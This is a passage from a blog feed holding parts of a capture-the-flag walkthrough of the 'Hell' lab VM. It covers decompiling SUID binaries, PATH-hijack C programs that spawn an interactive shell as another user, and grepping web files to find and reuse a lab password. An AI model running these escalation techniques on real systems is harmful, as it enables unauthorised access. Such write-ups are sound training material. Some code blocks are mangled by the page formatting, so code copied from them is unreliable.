      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
      system(&ldquo;/home/bazza/part2&rdquo;);
      pclose(v2);
      result = 0;
    }
  }
  return result;
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>OK, so part1 runs part2 <span class="o">(</span>this <span class="nb">time </span>with an absolute path<span class="o">)</span>, so <span class="nb">time </span><span class="k">for</span> a quick peek into part2
</span><span class='line'>
</span><span class='line'><span class="o">[</span>c<span class="o">]</span>int __cdecl main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>  __gid_t v0<span class="p">;</span> // eax@2
</span><span class='line'>  int result<span class="p">;</span> // eax@2
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span> getegid<span class="o">()</span> <span class="o">==</span> <span class="m">1003</span> <span class="o">)</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    puts<span class="o">(</span><span class="s2">&quot;\nCan&#39;t touch this *nah na na na na naaaaaaaa nah*&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="o">{</span>
</span><span class='line'>    <span class="nv">v0</span> <span class="o">=</span> getegid<span class="o">()</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">printf</span><span class="o">(</span><span class="s2">&quot;\n\nError! %d ID detected ... you&#39;re not allowed to run this, please use part 1!\n&quot;</span>, v0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">result</span> <span class="o">=</span> 0<span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">return</span> result<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Error! <span class="m">1004</span> ID detected ... you<span class="err">&#39;</span>re not allowed to run this, please use part 1!
</span></code></pre></td></tr></table></div></figure>


<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can<span class="err">&#39;</span>t touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>bazza<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1003<span class="o">(</span>developers<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1005<span class="o">(</span>oj<span class="o">)</span>,1004<span class="o">(</span>bazza<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>bazza
</span></code></pre></td></tr></table></div></figure>


<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1005 );
 system(&ldquo;/usr/bin/id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last <span class="nb">time </span>and we<span class="err">&#39;</span>re good to go.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj</p>

<p>&#8220;`</p>

<p>Success !</p>

<p>Nearly there, only this hoop to jump through and we&rsquo;re done.  I figured this&rsquo;d be a 5 parter, now I know it is going to be.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough - Part 3]]></title>
    <link href="http://recrudesce.github.io/2014/07/19/hell-walkthrough-part-3/"/>
    <updated>2014-07-19T20:05:34+01:00</updated>
    <id>http://recrudesce.github.io/2014/07/19/hell-walkthrough-part-3</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | Part 3 | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<h2>I Want to Play a Game, But No Jigsaws, OK ?!</h2>

<p>The home folder for milk_4_life is pretty sparse, just a binary called &ldquo;game&rdquo;. However, it&rsquo;s owned by the george user, and has the suid attribute set.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ls -l
</span><span class='line'>total 20
</span><span class='line'>---s--x--x <span class="m">1</span> george      george      <span class="m">5743</span> Jun <span class="m">19</span> 18:24 game
</span></code></pre></td></tr></table></div></figure>


<p>Running the binary produces the following output, which doesn&rsquo;t tell us much other than it&rsquo;s &ldquo;listening&rdquo;. Like a overly intrusive neighbour.</p>

<!-- more -->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./game
</span><span class='line'>I<span class="err">&#39;</span>m listening
</span></code></pre></td></tr></table></div></figure>


<p>Netstat isn&rsquo;t available on this VM, so we have to find another way to obtain listening port information. Thankfully ss saves the day and shows the game binary IS actually listening, on port 1337 - h4x !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ss -lp
</span><span class='line'>State       Recv-Q Send-Q    Local Address:Port    Peer Address:Port
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">50</span>        127.0.0.1:mysql       *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::sunrpc             :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:sunrpc              *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::http               :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::38035              :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:35380               *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       :::ssh                :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">128</span>       *:ssh                 *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">10</span>        *:1337                *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">20</span>        ::1:smtp              :::*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">20</span>        127.0.0.1:smtp        *:*
</span><span class='line'>LISTEN      <span class="m">0</span>      <span class="m">10</span>        *:666                 *:*
</span></code></pre></td></tr></table></div></figure>


<p>Connecting to the port from another session asks us to type &ldquo;START&rdquo; to begin. It&rsquo;s more fun to troll the code, though, by typing something completely different. Did you expect anything less of me ?</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
</span><span class='line'>
</span><span class='line'>banana
</span><span class='line'>No... START. S-T-A-R-T
</span><span class='line'>
</span><span class='line'>Connection closed by foreign host.
</span></code></pre></td></tr></table></div></figure>


<p>OK, enough messing around, let&rsquo;s see what this game does. Typing START presents us with a high score, and then math questions that only your high school math teacher would ask you infront of the rest of the class. Needless to say I&rsquo;m not answering any of these correctly !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'>Type <span class="s1">&#39;START&#39;</span> to begin
</span><span class='line'>
</span><span class='line'>START
</span><span class='line'>Starting...
</span><span class='line'>
</span><span class='line'>You have <span class="m">30</span> seconds to get as many points as you can, beat the high score! <span class="o">(</span>High Score: 133723<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Quick what<span class="s1">&#39;s... 924 x 541? Umm</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">982</span> x 21? No idea
</span><span class='line'>Quick what<span class="s1">&#39;s... 194 x 542? Really ?</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">679</span> x 733? WHY WOULD I NEED TO KNOW THIS !?
</span><span class='line'>Quick what<span class="s1">&#39;s... 960 x 248? I give up.</span>
</span><span class='line'><span class="s1">Quick what&#39;</span>s... <span class="m">718</span> x 646? THANKS OBAMA !
</span><span class='line'>Quick what<span class="err">&#39;</span>s... <span class="m">162</span> x 784? ^C
</span><span class='line'>Connection closed by foreign host
</span></code></pre></td></tr></table></div></figure>


<p>Being the competitive person I am, I figured it would be fun to try and beat the score. More than 133723 points in 30 seconds means I have to answer 4457 correct answers a second. I can type quickly, but not that quickly. This requires some scripting - Python to the rescue ! This script connects to the game, reads the question, splits it based on &ldquo; x &rdquo; to get both numbers, performs the multiplication and sends the answer back. Granted I had some help on with this code - thanks c0ne !</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">connect</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">1337</span><span class="p">))</span> <span class="c"># hardcoded IP address</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c"># login procedure</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">110</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>    <span class="n">l</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s... (.*?)\?&quot;</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="ow">not</span> <span class="n">l</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">d</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">l</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">mul</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">mul</span><span class="p">)</span>
</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">mul</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running it produces a sense of authority over our robot overlords - I&rsquo;m gaming the game.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>python gamey3.py
</span><span class='line'>125451
</span><span class='line'>150858
</span><span class='line'>498300
</span><span class='line'>493353
</span><span class='line'>60564
</span><span class='line'>**** SNIP ****
</span><span class='line'>174386
</span><span class='line'>841312
</span><span class='line'>53636
</span><span class='line'>Final Score: 412619
</span><span class='line'>
</span><span class='line'>!*!*!*!*! Congratulations, new high score <span class="o">(</span>412619<span class="o">)</span> !*!*!*!*!
</span><span class='line'>
</span><span class='line'>I hear the faint sound of chmodding.......
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/high_score_320x320.png" alt="high_score_320x320" /></p>

<p>It seems that the binary performs an action when the highscore is beaten. I&rsquo;m not sure what it chmods, but I wonder if we can play this game at it&rsquo;s own game and make it run a bogus binary. There&rsquo;s a distinct possibility the code is relying on the PATH environment variable and just calling system(&ldquo;chmod file&rdquo;) rather than using an absolute path.</p>

<p>So, a bogus chmod binary is created using the following source, compiled, placed in /tmp on the VM and made executable (do I need to show you how to do this ? No ? Good. Saves me the typing.)</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1000 );
 system(&ldquo;id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>The path environment variable is modified to make /tmp the first location checked
</span></code></pre></td></tr></table></div></figure>


<p> bash
$ PATH=/tmp:$PATH
$ export | grep PATH
export PATH=&lsquo;/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games&rsquo;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>So, hopefully, <span class="k">if</span> all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score <span class="o">(</span>I<span class="err">&#39;</span>m not going to show you again, just scroll up <span class="k">if</span> you want to see what it looks like<span class="o">)</span>.
</span><span class='line'>
</span><span class='line'>The score is beaten and we are indeed dropped to a new shell as the george user.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ./game
I&rsquo;m listening
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$</p>

<p>&#8220;`</p>

<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough – Part 2]]></title>
    <link href="http://recrudesce.github.io/2014/07/18/hell-walkthrough-part-2/"/>
    <updated>2014-07-18T21:27:04+01:00</updated>
    <id>http://recrudesce.github.io/2014/07/18/hell-walkthrough-part-2</id>
    <content type="html"><![CDATA[<p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | Part 2 | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>So, yesterday we got a shell on Hell as www-data. Today we&rsquo;ll escalate through some of the users on our quest to root.  If you&rsquo;ve not read <a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a>, I suggest you do so now.  I&rsquo;ll wait.  Go on, don&rsquo;t be shy, I&rsquo;ll still be here when you get back.</p>

<p>Done ?  Great - let us continue.</p>

<!-- more -->


<p>Catting /etc/passwd gives us a list of users that are potentially useful</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>george:x:1000:1000:george,,,:/home/george:/bin/bash
</span><span class='line'>jack:x:1001:1001::/home/jack:/bin/sh
</span><span class='line'>milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
</span><span class='line'>developers:x:1003:1003::/home/developers:/bin/sh
</span><span class='line'>bazza:x:1004:1004::/home/bazza:/bin/sh
</span><span class='line'>oj:x:1005:1005::/home/oj:/bin/sh
</span></code></pre></td></tr></table></div></figure>


<hr />

<h2>Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k</h2>

<p>Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.</p>

<p>A quick grep on the files in /super_secret_login_path_muhahaha/ for the word &ldquo;password&rdquo; results in the following</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>grep password /var/www/super_secret_login_path_muhahaha/*
</span><span class='line'>index.php:&lt;INPUT <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;password&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span>/&gt;
</span><span class='line'>login.php:    <span class="nv">$password</span> <span class="o">=</span> mysql_escape_string<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">])</span><span class="p">;</span>
</span><span class='line'>login.php:    // mysql_connect<span class="o">(</span><span class="s2">&quot;127.0.0.1&quot;</span>, <span class="s2">&quot;Jack&quot;</span>, <span class="s2">&quot;zgcR6mU6pX&quot;</span><span class="o">)</span> or die <span class="o">(</span><span class="s2">&quot;Server Error&quot;</span><span class="o">)</span><span class="p">;</span> I<span class="s1">&#39;ll change this back once development is done. Got sick of typing my password.</span>
</span><span class='line'><span class="s1">login.php:   $sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#39;</span><span class="nv">$username</span><span class="s1">&#39; and password=&#39;</span><span class="nv">$password</span><span class="err">&#39;</span><span class="s2">&quot;;</span>
</span><span class='line'><span class="s2">personal.php:&lt;INPUT name=&quot;</span>password<span class="s2">&quot; id=&quot;</span>password<span class="s2">&quot; type=&quot;</span>password<span class="s2">&quot; value=&quot;</span><span class="err">&quot;</span>/&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, what do I spy with my little eye ? Could that be Jack&rsquo;s password commented out in login.php ? Let us try this password&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>su jack
</span><span class='line'>Password: zgcR6mU6pX
</span><span class='line'>
</span><span class='line'><span class="nv">$ </span>whoami
</span><span class='line'>jack
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we&rsquo;re going to need it.</p>

<hr />

<h2>Got Milk ? Want Any ?</h2>

<p>Poking around Jack&rsquo;s home folder is like walking into a public toilet while bursting for a wee - you don&rsquo;t really want to touch anything, but have to else you&rsquo;re going to have problems.</p>

<p>The first thing that draws my eye is the g0tmi1k_pics folder. It&rsquo;s somewhere you know you don&rsquo;t want to go, but seems to have this strange come-hither vibe about it. It&rsquo;s like a car crash&hellip; gruesome but you can&rsquo;t help but look. So I did. Now I wish I didn&rsquo;t. Exhibit A, and B, and C.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg" alt="1" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg" alt="2" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg" alt="3" /></a></p>

<p>Yeah&hellip;
Jack, you&rsquo;re a strange one, I&rsquo;ll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they&rsquo;re asking for you - shall I tell them you&rsquo;re &ldquo;out&rdquo; ?</p>

<p>So, while Jack might reuse passwords, he&rsquo;s sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.</p>

<p>[plain]
&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>As suspected, Jack uses PGP on the <span class="nb">local </span>host, therefore his PGP keys are stored in /home/jack/.pgp, <span class="nb">complete </span>with a note giving us a password hint.
</span></code></pre></td></tr></table></div></figure>


<p> bash</p>

<p>$ ls -l .pgp
ls -l .pgp
total 12
-rwx&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
-rwx&mdash;&mdash; 1 jack jack 1802 Jun 18 12:20 pgp.priv
